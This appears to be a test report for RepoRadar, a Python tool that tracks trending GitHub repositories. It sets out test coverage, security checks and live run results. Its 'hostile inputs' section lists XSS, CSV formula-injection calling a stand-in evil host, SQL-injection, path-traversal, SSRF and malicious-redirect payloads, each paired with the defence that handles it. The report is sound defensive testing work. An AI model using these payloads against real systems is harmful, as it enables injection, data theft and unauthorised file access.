# ✅ Test report — RepoRadar v1.0.0

Executed on **2026-11-24**, Python **3.13.18**, Linux sandbox, Asia/Kolkata. All tests are offline and deterministic unless explicitly marked live.

## Headline results

| Command | Result |
|---|---|
| `python -m pytest tests -q` | **116 passed, 43 subtests passed** in ~1.2 s |
| `python repodar.py selftest` | **Ran 116 tests — OK** |
| `ruff check src tests repodar.py` | **All checks passed** |
| `bandit -r src -q -c bandit.yml` | **0 issues** (1 reviewed exception: B104) |
| `python -m compileall -q src tests repodar.py` | OK |
| `python repodar.py doctor` | **13/13 PASS** |
| `python repodar.py doctor --live` | GitHub API reachable (live) |
| `python repodar.py secret-scan` | clean |
| Live full pipeline (real API + Trending) | 8 sources, 28 picks, 0 warnings, 33 s |
| HTTP smoke test of static server | 200 / 404 / 405 / headers / CSP / traversal all pass |

---

## Test matrix

| File | Tests | What it proves |
|---|---:|---|
| `test_security.py` | 18 | redaction of 9 credential shapes, secret scanner, `.env` skipping, HTTPS/allowlist/userinfo/port/control-char rejection, private-IP DNS rejection, custom-webhook opt-in, path traversal, 0600/0700 permissions, HTML/XML/Markdown escaping, slug validation |
| `test_config.py` | 8 | safe defaults (no notify, dry-run), token budget change, redacted `describe()`, 10 invalid-config cases, IANA timezone validation, `.env` parsing + env precedence, budget cap |
| `test_http.py` | 10 | JSON parsing, auth header (token never in URL), rate-limit header tracking, 403 retry with `Retry-After`, 5xx exponential backoff, redirect re-validation (evil host + http), response-size cap, redacted errors, zero-network guarantee, `retry_delay()` |
| `test_trending.py` | 6 | real-markup parsing, comma numbers, HTML entity unescaping, missing-field degradation, markup drift → `[]`, developer parsing, bundled snapshot conversion |
| `test_sources.py` | 8 | query budget never exceeded, deterministic daily rotation, user query bounds, multi-source merge/dedupe, one broken source survives, `incomplete_results` warning, all-dead explicit state, offline demo date shifting |
| `test_store.py` | 11 | schema + `integrity_check`, 0600 db / 0700 dir, first/last seen, **SQL-injection-shaped slug rejected**, snapshots + previous, same-day idempotency, repeat suppression, digest meta, topic baseline, developer memory, redacted export, invalid date |
| `test_scoring.py` | 10 | measured/trending/estimated/unknown velocity, negative delta, bounded features, deterministic scores + reasons, young > stale, 4 sections with no duplicate repos, exclusion of archived/fork/template/dust, memory-based suppression, topic breakout, developer dedupe |
| `test_digest.py` | 11 | JSON contract, Markdown escaping, valid RSS XML, **CSV formula injection neutralised**, 4,096-char Telegram splitting, hard-split of pathological lines, Discord/Slack limits, CSP + no external assets + escaped seed, all site artifacts, manifest + service worker |
| `test_notify.py` | 8 | target detection, dry-run sends nothing, 3-channel send without token in body/headers, custom host blocked by default, private host blocked even when opted in, failed channel isolated + redacted, test message, no-target safety |
| `test_server.py` | 11 | index/feed 200, security headers, `/api/status`, **traversal + hidden + disallowed extensions → 404**, archive/manifest/sw/icon, POST/PUT/DELETE → 405, HEAD correctness, query strings not leaking |
| `test_pipeline.py` | 6 | full offline end-to-end, **no token or external asset in any generated file**, same-day idempotency, **day-two measured velocity from memory**, dry-run notify, all-dead collection fails loudly |
| `test_cli.py` | 11 | version/help, `init` creates 0600 `.env`, `--json` output, human output, redacted status, doctor 13/13, secret scan clean + planted-credential detection (redacted), invalid flag → exit 2, no-channel notify, dry-run notify |

**Total: 116 tests + 43 subtests.** No test touches the real network. Fakes inject `HttpClient.transport`, `sleeper`, and `clock`.

---

## Hostile inputs exercised

```
<script>alert("xss")</script>          → escaped in HTML/MD/RSS, inert in embedded JSON
javascript:alert(1)                   → link rejected, falls back to https://github.com/
=HYPERLINK("http://evil/…"&A1)        → CSV cell prefixed with '
acme/rocket'; DROP TABLE repos;--     → slug rejected before SQL
../.env , %2e%2e%2f.env , //etc/passwd→ 404
https://127.0.0.1/hook                → SSRF blocked (even with custom opt-in)
https://evil.example.com redirect     → blocked on the redirect hop
401 body containing a token           → error message redacted
403 / 429 / 500 / 503                 → retry / backoff / clear failure
```

---

## Live integration (manual, 2026-11-24)

```
python repodar.py run
  🛰️ RepoRadar 2026-11-24 [LIVE]
  28 picks · 8 sources · 33.09 s
  sources: search:new_hot, search:new_rising, search:hidden_gems,
           search:fork_magnets, search:topic_pulse, search:new-developers,
           trending:daily, trending:developers
  warnings: none
python repodar.py status
  database 0600 · integrity ok · 146 repos tracked · 177 snapshots
```

Rate limits were respected (6 search calls spaced ≥6.5 s), no 403s, no retries needed. Three scraped Trending star counts were cross-checked against `/repos/{owner}/{repo}` and matched exactly.

---

## How to re-run everything

```bash
cd reporadar
python repodar.py selftest                # stdlib only, no pytest needed
python -m pytest tests -q                 # optional, nicer output
python repodar.py doctor --live
python repodar.py secret-scan
ruff check src tests repodar.py           # optional dev tool
bandit -r src -q -c bandit.yml           # optional dev tool
python repodar.py run --demo
python repodar.py serve --port 8080       # then curl -I http://localhost:8080/
```

CI (`.github/workflows/ci.yml`) runs the same checks on every push and pull request.

---

## Known, accepted behaviour

- `B104` (bind `0.0.0.0`) is skipped in `bandit.yml`: the server is read-only static files and needs LAN/mobile/preview access. `--host 127.0.0.1` restricts it. Justification in [SECURITY.md](SECURITY.md#3-one-reviewed-exception).
- Markup-drift tests intentionally expect `[]` rather than an exception — a changed GitHub layout must not break a daily post.
- Day-one velocity is an estimate; day two is measured. Tested explicitly in `test_pipeline.py`.
